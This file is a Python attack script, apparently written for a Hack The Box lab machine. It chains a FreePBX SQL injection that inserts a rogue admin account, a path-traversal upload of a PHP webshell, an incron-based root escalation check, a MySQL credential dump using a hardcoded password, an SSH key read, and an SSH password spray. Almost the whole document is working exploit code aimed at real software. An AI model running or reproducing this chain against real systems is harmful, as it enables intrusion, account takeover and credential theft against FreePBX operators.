#!/usr/bin/env python3
"""Confirm incron root + harvest creds from MySQL + local SSH tests."""
import hashlib
import pathlib
import random
import re
import string
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://connected.htb"
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot")
IP = "10.129.245.100"


def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def hx(t):
    return "0x" + t.encode().hex()


def get_shell():
    s = requests.Session()
    s.verify = False
    user = "svc_" + rnd(5)
    pw = rnd(12)
    sha1 = hashlib.sha1(pw.encode()).hexdigest()
    shell_dir = rnd(10)
    shell_name = rnd(8) + ".php"

    def sqli(pl):
        s.get(
            f"{BASE}/admin/ajax.php",
            params={
                "module": r"FreePBX\modules\endpoint\ajax",
                "command": "model",
                "template": "x",
                "model": "model",
                "brand": pl,
            },
            timeout=120,
        )

    sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(user)}-- -")
    sqli(
        "x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) "
        f"VALUES ({hx(user)},{hx(sha1)},0x2a)-- -"
    )
    s.get(f"{BASE}/admin/config.php", timeout=120)
    s.post(
        f"{BASE}/admin/config.php",
        data={"username": user, "password": pw},
        timeout=120,
    )
    webshell = b'<?php if(isset($_REQUEST["c"])){echo "___B___";system($_REQUEST["c"]);echo "___E___";} ?>'
    files = {
        "dzuuid": (None, "x"),
        "dzchunkindex": (None, "0"),
        "dztotalfilesize": (None, "10"),
        "dzchunksize": (None, "1"),
        "dztotalchunkcount": (None, "1"),
        "dzchunkbyteoffset": (None, "0"),
        "fwbrand": (None, f"../../../var/www/html/{shell_dir}"),
        "fwmodel": (None, "1"),
        "fwversion": (None, "1"),
        "file": (shell_name, webshell, "application/x-php"),
    }
    headers = {
        "Referer": f"{BASE}/admin/config.php?display=epm_advanced",
        "X-Requested-With": "XMLHttpRequest",
    }
    s.post(
        f"{BASE}/admin/ajax.php?module=endpoint&command=upload_cust_fw",
        files=files,
        headers=headers,
        timeout=120,
    )
    url = f"{BASE}/{shell_dir}/{shell_name}"

    def cmd(c, timeout=120):
        r = s.get(url, params={"c": c}, timeout=timeout)
        if "___B___" in r.text:
            return r.text.split("___B___", 1)[1].split("___E___", 1)[0].strip()
        return r.text[:5000]

    return cmd, url


def main():
    print("[*] shell...")
    cmd, url = get_shell()
    print("[+]", url)
    lines = [f"shell: {url}\n"]

    # --- incron root confirm ---
    print("[*] incron sysadmin.dump-iptables.CONTENTS")
    o = cmd(
        "rm -f /tmp/iptables-save-output /tmp/incron_root_proof 2>/dev/null; "
        "touch /var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
        "sleep 4; "
        "ls -la /tmp/iptables-save-output 2>&1; "
        "head -5 /tmp/iptables-save-output 2>&1; "
        "ls -la /var/spool/asterisk/incron/",
        timeout=150,
    )
    lines.append("=== incron dump-iptables ===\n" + o + "\n")
    print(o)
    root_ok = "iptables-save-output" in o and "No such file" not in o.split("ls -la /tmp/iptables-save-output")[-1][:80]

    # proof file as root via hook with CONTENTS if dump worked, try update-ports with param
    if not root_ok:
        print("[*] retry: echo > incron file")
        o2 = cmd(
            "echo x > /var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; sleep 4; "
            "stat /tmp/iptables-save-output 2>&1",
            timeout=150,
        )
        lines.append("=== retry ===\n" + o2 + "\n")
        print(o2)
        root_ok = "iptables-save-output" in o2 and "cannot stat" not in o2.lower()

    lines.append(f"ROOT_INCRON_CONFIRMED={root_ok}\n")

    # --- MySQL creds ---
    print("[*] mysql cred harvest")
    sql = (
        "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h 127.0.0.1 asterisk -e "
        "'SELECT username,password_sha1 FROM ampusers;' "
        "'SELECT username,password FROM userman_users WHERE password IS NOT NULL AND password!=\"\";' "
        "'SELECT * FROM cxpanel_users LIMIT 10;' 2>&1"
    )
    o = cmd(sql, timeout=90)
    lines.append("=== mysql creds ===\n" + o + "\n")
    print(o[:3000])

    # ssh keys in home
    o = cmd(
        "for h in /home/asterisk /root; do echo HOME=$h; ls -la $h/.ssh 2>&1; cat $h/.ssh/authorized_keys 2>/dev/null; done; "
        "grep -r Password /home/asterisk 2>/dev/null | head -5",
        timeout=60,
    )
    lines.append("=== ssh keys ===\n" + o + "\n")

    out_path = LOOT / "root-incron-ssh.txt"
    out_path.write_text("\n".join(lines))

    # Parse usernames/passwords for local ssh spray (plaintext from userman only)
    creds = []
    for line in o.splitlines() if False else []:
        pass
    for line in (LOOT / "root-incron-ssh.txt").read_text().splitlines():
        if line.startswith("userman\t") or "\t" in line:
            parts = line.split("\t")
            if len(parts) >= 3 and parts[0] == "userman":
                creds.append((parts[1], parts[2]))

    mysql_text = (LOOT / "root-incron-ssh.txt").read_text()
    for m in re.finditer(r"userman\t([^\t]+)\t([^\t\n]+)", mysql_text):
        creds.append((m.group(1), m.group(2)))

    # also try common: admin with nothing from ampusers - sha1 only
    users_ssh = ["admin", "root", "asterisk", "freepbx"]
    passes_ssh = list({p for _, p in creds})
    passes_ssh.append("mZzDpAGKTmPJ")

    print("[*] local SSH spray (from Kali)")
    ssh_log = []
    for u in users_ssh:
        for p in passes_ssh[:15]:
            if not p or len(p) > 200:
                continue
            r = subprocess.run(
                [
                    "sshpass",
                    "-p",
                    p,
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "ConnectTimeout=8",
                    "-o",
                    "BatchMode=no",
                    f"{u}@{IP}",
                    "id",
                ],
                capture_output=True,
                text=True,
                timeout=15,
            )
            if r.returncode == 0 and "uid=" in r.stdout:
                hit = f"HIT {u}:{p} -> {r.stdout.strip()}"
                print("[+]", hit)
                ssh_log.append(hit)
            elif "Permission denied" not in (r.stderr + r.stdout):
                ssh_log.append(f"{u}:{p[:20]}... rc={r.returncode} {r.stderr[:80]}")

    (LOOT / "ssh-spray.txt").write_text("\n".join(ssh_log) if ssh_log else "no ssh hits\n")
    (LOOT / "copy-paste.txt").write_text(
        (LOOT / "copy-paste.txt").read_text()
        if (LOOT / "copy-paste.txt").exists()
        else ""
        + f"\nincron_root={root_ok}\nssh:\n"
        + "\n".join(ssh_log)
    )
    print(f"\n[+] {out_path}")
    print(f"incron root confirmed: {root_ok}")


if __name__ == "__main__":
    main()